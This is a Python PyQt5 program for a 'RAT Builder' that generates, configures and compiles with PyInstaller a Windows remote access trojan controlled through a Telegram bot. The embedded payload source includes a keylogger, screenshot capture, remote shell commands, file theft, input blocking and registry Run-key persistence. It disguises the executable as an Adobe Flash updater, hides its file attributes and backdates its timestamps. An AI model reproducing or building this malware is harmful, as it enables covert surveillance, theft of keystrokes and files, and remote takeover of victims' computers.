import os
import sys
import json
import threading
import tempfile
import shutil
import subprocess
import platform
from pathlib import Path
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import qdarkstyle

class RATBuilderGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = "rat_builder_config.json"
        self.init_ui()
        self.load_config()
        
    def init_ui(self):
        self.setWindowTitle("RAT Builder - Professional Security Tool")
        self.setGeometry(100, 100, 1400, 900)
        
        # Apply dark theme
        self.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5() + """
            QMainWindow {
                background-color: #1e1e1e;
            }
            QTextEdit {
                background-color: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New';
                border: 1px solid #333;
            }
            QPushButton {
                background-color: #2b2b2b;
                color: #ffffff;
                border: 1px solid #555;
                padding: 8px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #3a3a3a;
                border: 1px solid #00ff00;
            }
            QPushButton:pressed {
                background-color: #00ff00;
                color: #000000;
            }
            QLineEdit, QComboBox {
                background-color: #2b2b2b;
                color: #ffffff;
                border: 1px solid #555;
                padding: 6px;
                border-radius: 3px;
            }
            QProgressBar {
                border: 1px solid #555;
                border-radius: 3px;
                text-align: center;
                color: white;
            }
            QProgressBar::chunk {
                background-color: #00ff00;
            }
            QTabWidget::pane {
                border: 1px solid #555;
                background-color: #1e1e1e;
            }
            QTabBar::tab {
                background-color: #2b2b2b;
                color: #ffffff;
                padding: 8px 16px;
                border: 1px solid #555;
            }
            QTabBar::tab:selected {
                background-color: #00ff00;
                color: #000000;
            }
            QGroupBox {
                color: #00ff00;
                font-weight: bold;
                border: 1px solid #555;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QCheckBox {
                color: #ffffff;
                spacing: 5px;
            }
            QCheckBox::indicator {
                width: 15px;
                height: 15px;
            }
            QCheckBox::indicator:unchecked {
                border: 1px solid #555;
                background-color: #2b2b2b;
            }
            QCheckBox::indicator:checked {
                border: 1px solid #00ff00;
                background-color: #00ff00;
            }
        """)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        config_tab = self.create_config_tab()
        features_tab = self.create_features_tab()
        build_tab = self.create_build_tab()
        terminal_tab = self.create_terminal_tab()
        
        tabs.addTab(config_tab, "Configuration")
        tabs.addTab(features_tab, "Features")
        tabs.addTab(build_tab, "Build")
        tabs.addTab(terminal_tab, "Terminal")
        
    def create_config_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Bot Configuration
        bot_group = QGroupBox("Telegram Bot Configuration")
        bot_layout = QGridLayout(bot_group)
        
        bot_layout.addWidget(QLabel("Bot Token:"), 0, 0)
        self.bot_token = QLineEdit()
        self.bot_token.setPlaceholderText("1234567890:ABCdefGHIjklMNOpqrstUVWxyz123456")
        bot_layout.addWidget(self.bot_token, 0, 1)
        
        bot_layout.addWidget(QLabel("Trusted Users:"), 1, 0)
        self.trusted_users = QLineEdit()
        self.trusted_users.setPlaceholderText("123456789,987654321")
        bot_layout.addWidget(self.trusted_users, 1, 1)
        
        bot_layout.addWidget(QLabel("Trusted Chats:"), 2, 0)
        self.trusted_chats = QLineEdit()
        self.trusted_chats.setPlaceholderText("-1001234567890,-1009876543210")
        bot_layout.addWidget(self.trusted_chats, 2, 1)
        
        layout.addWidget(bot_group)
        
        # Persistence Options
        persist_group = QGroupBox("Persistence & Stealth")
        persist_layout = QGridLayout(persist_group)
        
        self.auto_start = QCheckBox("Enable Auto-Start Registry")
        self.auto_start.setChecked(True)
        persist_layout.addWidget(self.auto_start, 0, 0)
        
        self.hide_file = QCheckBox("Hide Executable Attributes")
        self.hide_file.setChecked(True)
        persist_layout.addWidget(self.hide_file, 0, 1)
        
        self.fake_name = QCheckBox("Use Adobe Flash Disguise")
        self.fake_name.setChecked(True)
        persist_layout.addWidget(self.fake_name, 1, 0)
        
        self.anti_analysis = QCheckBox("Basic Anti-Analysis")
        persist_layout.addWidget(self.anti_analysis, 1, 1)
        
        layout.addWidget(persist_group)
        
        # Connection Settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QGridLayout(conn_group)
        
        conn_layout.addWidget(QLabel("Check Interval (s):"), 0, 0)
        self.check_interval = QSpinBox()
        self.check_interval.setRange(5, 300)
        self.check_interval.setValue(10)
        conn_layout.addWidget(self.check_interval, 0, 1)
        
        conn_layout.addWidget(QLabel("Timeout (s):"), 1, 0)
        self.timeout = QSpinBox()
        self.timeout.setRange(10, 600)
        self.timeout.setValue(30)
        conn_layout.addWidget(self.timeout, 1, 1)
        
        layout.addWidget(conn_group)
        layout.addStretch()
        
        return widget
        
    def create_features_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Core Features
        core_group = QGroupBox("Core Features")
        core_layout = QGridLayout(core_group)
        
        self.feature_keylogger = QCheckBox("Keylogger")
        self.feature_keylogger.setChecked(True)
        core_layout.addWidget(self.feature_keylogger, 0, 0)
        
        self.feature_screenshot = QCheckBox("Screenshot Capture")
        self.feature_screenshot.setChecked(True)
        core_layout.addWidget(self.feature_screenshot, 0, 1)
        
        self.feature_file_manager = QCheckBox("File Manager")
        self.feature_file_manager.setChecked(True)
        core_layout.addWidget(self.feature_file_manager, 1, 0)
        
        self.feature_remote_shell = QCheckBox("Remote Shell")
        self.feature_remote_shell.setChecked(True)
        core_layout.addWidget(self.feature_remote_shell, 1, 1)
        
        self.feature_process_manager = QCheckBox("Process Manager")
        core_layout.addWidget(self.feature_process_manager, 2, 0)
        
        self.feature_webcam = QCheckBox("Webcam Capture")
        core_layout.addWidget(self.feature_webcam, 2, 1)
        
        self.feature_microphone = QCheckBox("Microphone Recording")
        core_layout.addWidget(self.feature_microphone, 3, 0)
        
        self.feature_block_input = QCheckBox("Block Input")
        self.feature_block_input.setChecked(True)
        core_layout.addWidget(self.feature_block_input, 3, 1)
        
        self.feature_system_info = QCheckBox("System Information")
        self.feature_system_info.setChecked(True)
        core_layout.addWidget(self.feature_system_info, 4, 0)
        
        layout.addWidget(core_group)
        
        # Advanced Features
        advanced_group = QGroupBox("Advanced Features")
        advanced_layout = QGridLayout(advanced_group)
        
        self.feature_persistence = QCheckBox("Advanced Persistence")
        advanced_layout.addWidget(self.feature_persistence, 0, 0)
        
        self.feature_evasion = QCheckBox("Anti-VM Evasion")
        advanced_layout.addWidget(self.feature_evasion, 0, 1)
        
        self.feature_encryption = QCheckBox("Communication Encryption")
        advanced_layout.addWidget(self.feature_encryption, 1, 0)
        
        layout.addWidget(advanced_group)
        layout.addStretch()
        
        return widget
        
    def create_build_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Build Options
        build_group = QGroupBox("Build Configuration")
        build_layout = QGridLayout(build_group)
        
        build_layout.addWidget(QLabel("Output Name:"), 0, 0)
        self.output_name = QLineEdit()
        self.output_name.setText("AdobeFlashPlayer.exe")
        build_layout.addWidget(self.output_name, 0, 1)
        
        build_layout.addWidget(QLabel("Output Directory:"), 1, 0)
        output_dir_layout = QHBoxLayout()
        self.output_dir = QLineEdit()
        self.output_dir.setText(str(Path.home() / "Desktop"))
        output_dir_layout.addWidget(self.output_dir)
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_output_dir)
        output_dir_layout.addWidget(browse_btn)
        build_layout.addLayout(output_dir_layout, 1, 1)
        
        build_layout.addWidget(QLabel("Python Version:"), 2, 0)
        self.python_version = QComboBox()
        self.python_version.addItems(["3.8", "3.9", "3.10", "3.11"])
        self.python_version.setCurrentText("3.8")
        build_layout.addWidget(self.python_version, 2, 1)
        
        build_layout.addWidget(QLabel("Compression:"), 3, 0)
        self.compression = QCheckBox("Use UPX Compression")
        self.compression.setChecked(True)
        build_layout.addWidget(self.compression, 3, 1)
        
        build_layout.addWidget(QLabel("OneFile Bundle:"), 4, 0)
        self.onefile = QCheckBox("Create Single Executable")
        self.onefile.setChecked(True)
        build_layout.addWidget(self.onefile, 4, 1)
        
        layout.addWidget(build_group)
        
        # Build Actions
        actions_group = QGroupBox("Build Actions")
        actions_layout = QHBoxLayout(actions_group)
        
        self.test_btn = QPushButton("Validate Configuration")
        self.test_btn.clicked.connect(self.validate_configuration)
        actions_layout.addWidget(self.test_btn)
        
        self.build_btn = QPushButton("Build Executable")
        self.build_btn.clicked.connect(self.build_executable)
        self.build_btn.setStyleSheet("background-color: #007acc; color: white;")
        actions_layout.addWidget(self.build_btn)
        
        self.export_btn = QPushButton("Save Configuration")
        self.export_btn.clicked.connect(self.save_config)
        actions_layout.addWidget(self.export_btn)
        
        layout.addWidget(actions_group)
        
        # Build Progress
        progress_group = QGroupBox("Build Progress")
        progress_layout = QVBoxLayout(progress_group)
        
        self.build_progress = QProgressBar()
        progress_layout.addWidget(self.build_progress)
        
        self.build_status = QLabel("Ready to build...")
        progress_layout.addWidget(self.build_status)
        
        layout.addWidget(progress_group)
        layout.addStretch()
        
        return widget
        
    def create_terminal_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        self.terminal = QTextEdit()
        self.terminal.setReadOnly(True)
        layout.addWidget(self.terminal)
        
        # Add initial message
        self.log_message("RAT Builder Terminal initialized")
        self.log_message("Configure your settings and click 'Build Executable'")
        
        return widget
        
    def browse_output_dir(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Output Directory", str(Path.home()))
        if directory:
            self.output_dir.setText(directory)
            
    def log_message(self, message):
        timestamp = QDateTime.currentDateTime().toString("hh:mm:ss")
        self.terminal.append(f"[{timestamp}] {message}")
        QApplication.processEvents()
        
    def validate_configuration(self):
        self.log_message("Validating configuration...")
        
        if not self.bot_token.text().strip():
            self.log_message("ERROR: Bot token is required!")
            QMessageBox.warning(self, "Validation Error", "Bot token is required!")
            return False
            
        if not self.trusted_users.text().strip():
            self.log_message("ERROR: At least one trusted user ID is required!")
            QMessageBox.warning(self, "Validation Error", "At least one trusted user ID is required!")
            return False
            
        self.log_message("Configuration validation passed!")
        return True
        
    def save_config(self):
        config = {
            'bot_token': self.bot_token.text(),
            'trusted_users': self.trusted_users.text(),
            'trusted_chats': self.trusted_chats.text(),
            'features': {
                'keylogger': self.feature_keylogger.isChecked(),
                'screenshot': self.feature_screenshot.isChecked(),
                'file_manager': self.feature_file_manager.isChecked(),
                'remote_shell': self.feature_remote_shell.isChecked(),
                'process_manager': self.feature_process_manager.isChecked(),
                'webcam': self.feature_webcam.isChecked(),
                'microphone': self.feature_microphone.isChecked(),
                'block_input': self.feature_block_input.isChecked(),
                'system_info': self.feature_system_info.isChecked(),
                'persistence': self.feature_persistence.isChecked(),
                'evasion': self.feature_evasion.isChecked(),
                'encryption': self.feature_encryption.isChecked()
            },
            'persistence': {
                'auto_start': self.auto_start.isChecked(),
                'hide_file': self.hide_file.isChecked(),
                'fake_name': self.fake_name.isChecked(),
                'anti_analysis': self.anti_analysis.isChecked()
            },
            'connection': {
                'check_interval': self.check_interval.value(),
                'timeout': self.timeout.value()
            },
            'build': {
                'output_name': self.output_name.text(),
                'output_dir': self.output_dir.text(),
                'python_version': self.python_version.currentText(),
                'compression': self.compression.isChecked(),
                'onefile': self.onefile.isChecked()
            }
        }
        
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.log_message(f"Configuration saved to {self.config_file}")
        except Exception as e:
            self.log_message(f"Error saving configuration: {str(e)}")
            
    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    
                self.bot_token.setText(config.get('bot_token', ''))
                self.trusted_users.setText(config.get('trusted_users', ''))
                self.trusted_chats.setText(config.get('trusted_chats', ''))
                
                features = config.get('features', {})
                self.feature_keylogger.setChecked(features.get('keylogger', True))
                self.feature_screenshot.setChecked(features.get('screenshot', True))
                self.feature_file_manager.setChecked(features.get('file_manager', True))
                self.feature_remote_shell.setChecked(features.get('remote_shell', True))
                self.feature_process_manager.setChecked(features.get('process_manager', False))
                self.feature_webcam.setChecked(features.get('webcam', False))
                self.feature_microphone.setChecked(features.get('microphone', False))
                self.feature_block_input.setChecked(features.get('block_input', True))
                self.feature_system_info.setChecked(features.get('system_info', True))
                self.feature_persistence.setChecked(features.get('persistence', False))
                self.feature_evasion.setChecked(features.get('evasion', False))
                self.feature_encryption.setChecked(features.get('encryption', False))
                
                persistence = config.get('persistence', {})
                self.auto_start.setChecked(persistence.get('auto_start', True))
                self.hide_file.setChecked(persistence.get('hide_file', True))
                self.fake_name.setChecked(persistence.get('fake_name', True))
                self.anti_analysis.setChecked(persistence.get('anti_analysis', False))
                
                connection = config.get('connection', {})
                self.check_interval.setValue(connection.get('check_interval', 10))
                self.timeout.setValue(connection.get('timeout', 30))
                
                build = config.get('build', {})
                self.output_name.setText(build.get('output_name', 'AdobeFlashPlayer.exe'))
                self.output_dir.setText(build.get('output_dir', str(Path.home() / "Desktop")))
                self.python_version.setCurrentText(build.get('python_version', '3.8'))
                self.compression.setChecked(build.get('compression', True))
                self.onefile.setChecked(build.get('onefile', True))
                
                self.log_message("Configuration loaded successfully")
            except Exception as e:
                self.log_message(f"Error loading configuration: {str(e)}")

    def generate_rat_code(self):
        """Generate the complete RAT source code based on configuration"""
        
        # Basic template with all required imports
        code = '''import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess
import ctypes
from PIL import ImageGrab
from telepot.loop import MessageLoop
from pynput.keyboard import Listener

class RAT:
    def __init__(self, bot, trusted_users, trusted_chats):
        self.bot = bot
        self.trusted_users = trusted_users
        self.trusted_chats = trusted_chats
        self.keylogger_active = False
        self.keylogger_thread = None
        self.keylogger_file = "keylog.txt"

        try:
            if sys.argv[1] == "--quiet":
                pass
        except IndexError:
            self.set_autorun()

        MessageLoop(self.bot, self.bot_handler).run_as_thread()
        print("Bot connected.")
        for chat in self.trusted_chats:
            self.bot.sendMessage(chat, "🤖 Bot connected.")
        for user in self.trusted_users:
            self.bot.sendMessage(user, "🤖 Bot connected.")

        while True:
            time.sleep(10)

    def set_autorun(self):
        """
        This function sets the script to run at startup on Windows.
        """
        application = sys.argv[0]
        start_path = os.path.join(os.path.abspath(os.getcwd()), application)
        copy2_path = os.path.join(winshell.my_documents(), "Adobe flash player")
        copy2_app = os.path.join(copy2_path, "Flash player updater.exe")

        if not os.path.exists(copy2_path):
            os.makedirs(copy2_path)

        try:
            win32api.CopyFile(start_path, copy2_app)
            win32api.SetFileAttributes(copy2_path, 2)
            os.utime(copy2_app, (1282372620, 1282372620))
            os.utime(copy2_path, (1282372620, 1282372620))

            startup_val = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path + " --quiet")
        except Exception as e:
            print(f"Error in set_autorun: {e}")

    def bot_handler(self, message):
        print(message)

        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]

        if user_id not in self.trusted_users and chat_id not in self.trusted_chats:
            self.bot.sendMessage(chat_id, ":D")
            return

        try:
            args = message["text"].split()
            command = args[0]
        except KeyError:
            if "document" in message:
                self.handle_file_upload(message)
            elif "photo" in message:
                self.handle_file_upload(message)
            return

        command_handlers = {
            "/help": self.send_help,
            "/cmd": self.execute_command,
            "/run": self.run_program,
            "/pwd": self.print_working_directory,
            "/ls": self.list_directory,
            "/cd": self.change_directory,
            "/screen": self.take_screenshot,
            "/download": self.download_file,
            "/keylogger": self.toggle_keylogger,
            "/blockinput": self.block_input,
'''

        # Add system info command if enabled
        if self.feature_system_info.isChecked():
            code += '            "/sysinfo": self.system_info,\n'

        code += '''        }

        if command in command_handlers:
            command_handlers[command](chat_id, args)
        else:
            self.bot.sendMessage(chat_id, "Unknown command. Type /help to see the list of commands.")

    def handle_file_upload(self, message):
        chat_id = message["chat"]["id"]
        try:
            if "document" in message:
                file_id = message["document"]["file_id"]
                file_name = message["document"]["file_name"]
            elif "photo" in message:
                file_id = message["photo"][-1]["file_id"]
                file_name = f"{file_id}.jpg"
            else:
                return

            file_path = self.bot.getFile(file_id)['file_path']
            link = f"https://api.telegram.org/file/bot{self.bot.token}/{file_path}"
            response = requests.get(link, stream=True)
            save_path = os.path.join(os.getcwd(), file_name)

            with open(save_path, "wb") as out_file:
                shutil.copyfileobj(response.raw, out_file)

            self.bot.sendMessage(chat_id, f"File '{file_name}' uploaded successfully.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Failed to upload file: {e}")

    def send_help(self, chat_id, args):
        help_text = """
/help - Show this help message
/cmd <command> - Execute a shell command
/run <program> - Run a program
/pwd - Print working directory
/ls [path] - List directory contents
/cd <path> - Change directory
/screen - Take a screenshot
/download <file> - Download a file
/keylogger - Start/stop the keylogger
/blockinput <seconds> - Block mouse and keyboard input
'''
        
        if self.feature_system_info.isChecked():
            code += '/sysinfo - Get system information\n'
        
        code += '''        """
        self.bot.sendMessage(chat_id, help_text)

    def execute_command(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /cmd <command>")
            return
        try:
            result = subprocess.check_output(' '.join(args[1:]), shell=True, stderr=subprocess.STDOUT)
            self.bot.sendMessage(chat_id, result.decode('utf-8', errors='ignore'))
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error executing command: {e}")

    def run_program(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /run <program>")
            return
        try:
            subprocess.Popen(args[1:], shell=True)
            self.bot.sendMessage(chat_id, "Program started.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error running program: {e}")

    def print_working_directory(self, chat_id, args):
        try:
            self.bot.sendMessage(chat_id, os.getcwd())
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error getting current directory: {e}")

    def list_directory(self, chat_id, args):
        path = args[1] if len(args) > 1 else "."
        try:
            self.bot.sendMessage(chat_id, '\\n'.join(os.listdir(path)))
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error listing directory: {e}")

    def change_directory(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /cd <path>")
            return
        try:
            os.chdir(args[1])
            self.bot.sendMessage(chat_id, f"Changed directory to {os.getcwd()}")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error changing directory: {e}")

    def take_screenshot(self, chat_id, args):
        try:
            image = ImageGrab.grab()
            image_path = "screenshot.jpg"
            image.save(image_path)
            with open(image_path, "rb") as f:
                self.bot.sendDocument(chat_id, f)
            os.remove(image_path)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error taking screenshot: {e}")

    def download_file(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /download <file>")
            return
        file_path = ' '.join(args[1:])
        try:
            with open(file_path, "rb") as f:
                self.bot.sendDocument(chat_id, f)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error downloading file: {e}")

    def block_input_thread(self, seconds, chat_id):
        user32 = ctypes.windll.user32
        try:
            user32.BlockInput(True)
            self.bot.sendMessage(chat_id, f"Input blocked for {seconds} seconds.")
            time.sleep(seconds)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"An error occurred while blocking input: {e}")
        finally:
            user32.BlockInput(False)
            self.bot.sendMessage(chat_id, "Input unblocked.")

    def block_input(self, chat_id, args):
        if len(args) < 2:
            self.bot.sendMessage(chat_id, "Usage: /blockinput <seconds>")
            return

        try:
            seconds = int(args[1])
            if seconds <= 0:
                self.bot.sendMessage(chat_id, "Please provide a positive number of seconds.")
                return

            thread = threading.Thread(target=self.block_input_thread, args=(seconds, chat_id))
            thread.daemon = True
            thread.start()

        except ValueError:
            self.bot.sendMessage(chat_id, "Invalid number of seconds provided.")
        except Exception as e:
            self.bot.sendMessage(chat_id, f"An error occurred: {e}")

    def keylogger_thread_func(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def on_press(self, key):
        with open(self.keylogger_file, "a") as f:
            f.write(f"{key}")

    def toggle_keylogger(self, chat_id, args):
        if self.keylogger_active:
            self.keylogger_active = False
            if self.listener:
                self.listener.stop()
            self.bot.sendMessage(chat_id, "Keylogger stopped.")

            try:
                with open(self.keylogger_file, "rb") as f:
                    self.bot.sendDocument(chat_id, f)
                os.remove(self.keylogger_file)
            except FileNotFoundError:
                self.bot.sendMessage(chat_id, "Log file not found. It might be empty.")
            except Exception as e:
                self.bot.sendMessage(chat_id, f"Error sending log file: {e}")
        else:
            self.keylogger_active = True
            self.bot.sendMessage(chat_id, "Keylogger started.")
            self.keylogger_thread = threading.Thread(target=self.keylogger_thread_func)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
'''

        # Add system info method if enabled
        if self.feature_system_info.isChecked():
            code += '''
    def system_info(self, chat_id, args):
        try:
            import platform
            import socket
            
            info = f"""
🤖 System Information:

💻 Computer Name: {socket.gethostname()}
🖥️ OS: {platform.system()} {platform.release()}
🏷️ Version: {platform.version()}
⚙️ Architecture: {platform.architecture()[0]}
👤 User: {getpass.getuser()}
📁 Current Directory: {os.getcwd()}
            """
            self.bot.sendMessage(chat_id, info)
        except Exception as e:
            self.bot.sendMessage(chat_id, f"Error getting system info: {e}")
'''

        # Main function
        trusted_users = self.trusted_users.text().strip()
        trusted_chats = self.trusted_chats.text().strip()
        
        code += f'''
def main():
    token = "{self.bot_token.text().strip()}"
    trusted_users = [{trusted_users}]
    trusted_chats = [{trusted_chats}]

    if token == "YOUR_BOT_TOKEN":
        print("Please replace 'YOUR_BOT_TOKEN' with your actual bot token.")
        sys.exit(1)

    bot = telepot.Bot(token)
    rat = RAT(bot, trusted_users, trusted_chats)

if __name__ == '__main__':
    main()
'''

        return code

    def build_executable(self):
        if not self.validate_configuration():
            return

        self.log_message("Starting build process...")
        self.build_progress.setValue(0)

        try:
            # Step 1: Create temporary build directory
            self.build_progress.setValue(10)
            self.build_status.setText("Creating build environment...")
            self.log_message("Creating build environment...")
            
            build_dir = Path(self.temp_dir) / "build"
            build_dir.mkdir(exist_ok=True)
            
            # Step 2: Generate the RAT source code
            self.build_progress.setValue(20)
            self.build_status.setText("Generating source code...")
            self.log_message("Generating RAT source code...")
            
            rat_code = self.generate_rat_code()
            source_file = build_dir / "rat_client.py"
            with open(source_file, 'w', encoding='utf-8') as f:
                f.write(rat_code)
            
            # Step 3: Create requirements file
            self.build_progress.setValue(30)
            self.build_status.setText("Creating dependencies file...")
            self.log_message("Creating requirements.txt...")
            
            requirements = build_dir / "requirements.txt"
            with open(requirements, 'w') as f:
                f.write("""telepot==1.4
pywin32==306
pynput==1.7.6
Pillow==10.0.1
requests==2.31.0
winshell==0.6
""")
            
            # Step 4: Install dependencies
            self.build_progress.setValue(40)
            self.build_status.setText("Installing dependencies...")
            self.log_message("Installing Python dependencies...")
            
            try:
                subprocess.run([
                    sys.executable, "-m", "pip", "install", "-r", str(requirements)
                ], check=True, capture_output=True)
            except subprocess.CalledProcessError as e:
                self.log_message(f"Warning: Some dependencies may not have installed correctly: {e}")
            
            # Step 5: Build with PyInstaller
            self.build_progress.setValue(50)
            self.build_status.setText("Compiling executable...")
            self.log_message("Compiling with PyInstaller...")
            
            output_dir = Path(self.output_dir.text())
            output_name = self.output_name.text()
            
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile" if self.onefile.isChecked() else "--onedir",
                "--console" if not self.auto_start.isChecked() else "--noconsole",
                "--name", output_name.replace('.exe', ''),
                "--distpath", str(output_dir),
                "--workpath", str(build_dir / "build"),
                "--specpath", str(build_dir),
                str(source_file)
            ]
            
            if self.compression.isChecked():
                pyinstaller_cmd.append("--upx-dir=upx")
            
            # Add hidden imports
            hidden_imports = [
                'win32timezone', 'pynput.keyboard._win32', 'pynput.mouse._win32',
                'telepot.namedtuple', 'telepot.exception', 'PIL._imaging'
            ]
            for imp in hidden_imports:
                pyinstaller_cmd.extend(['--hidden-import', imp])
            
            self.log_message(f"Running: {' '.join(pyinstaller_cmd)}")
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=build_dir)
            
            if result.returncode != 0:
                self.log_message(f"PyInstaller error: {result.stderr}")
                raise Exception("PyInstaller compilation failed")
            
            # Step 6: Finalize build
            self.build_progress.setValue(90)
            self.build_status.setText("Finalizing executable...")
            self.log_message("Finalizing build...")
            
            executable_path = output_dir / output_name
            if executable_path.exists():
                self.log_message(f"Build successful! Executable created: {executable_path}")
                
                # Apply file attributes if hiding is enabled
                if self.hide_file.isChecked():
                    try:
                        FILE_ATTRIBUTE_HIDDEN = 0x02
                        ctypes.windll.kernel32.SetFileAttributesW(str(executable_path), FILE_ATTRIBUTE_HIDDEN)
                        self.log_message("Hidden attributes applied to executable")
                    except Exception as e:
                        self.log_message(f"Warning: Could not set hidden attributes: {e}")
            else:
                # Try to find the actual output path
                possible_paths = [
                    output_dir / output_name,
                    output_dir / (output_name.replace('.exe', '') + '.exe'),
                    output_dir / "dist" / output_name,
                ]
                
                for path in possible_paths:
                    if path.exists():
                        self.log_message(f"Build successful! Executable created: {path}")
                        break
                else:
                    raise Exception("Executable not found in expected locations")
            
            self.build_progress.setValue(100)
            self.build_status.setText("Build completed successfully!")
            self.log_message("Build process completed!")
            
            QMessageBox.information(self, "Build Complete", 
                                  f"Executable successfully created at:\\n{executable_path}")
            
        except Exception as e:
            self.log_message(f"Build failed: {str(e)}")
            self.build_status.setText("Build failed!")
            QMessageBox.critical(self, "Build Failed", f"Build process failed:\\n{str(e)}")
            
    def closeEvent(self, event):
        """Cleanup temporary files on exit"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except:
            pass
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Check if running on Windows
    if platform.system() != 'Windows':
        QMessageBox.critical(None, "Error", "This tool only works on Windows systems.")
        # sys.exit(1)
    
    # Check for required dependencies
    try:
        import PyInstaller
    except ImportError:
        reply = QMessageBox.question(None, "Missing Dependency", 
                                   "PyInstaller is required for building executables.\\n"
                                   "Would you like to install it now?",
                                   QMessageBox.Yes | QMessageBox.No)
        if reply == QMessageBox.Yes:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
                QMessageBox.information(None, "Success", "PyInstaller installed successfully!")
            except subprocess.CalledProcessError:
                QMessageBox.critical(None, "Error", "Failed to install PyInstaller. Please install it manually.")
                sys.exit(1)
        else:
            sys.exit(1)
    
    window = RATBuilderGUI()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()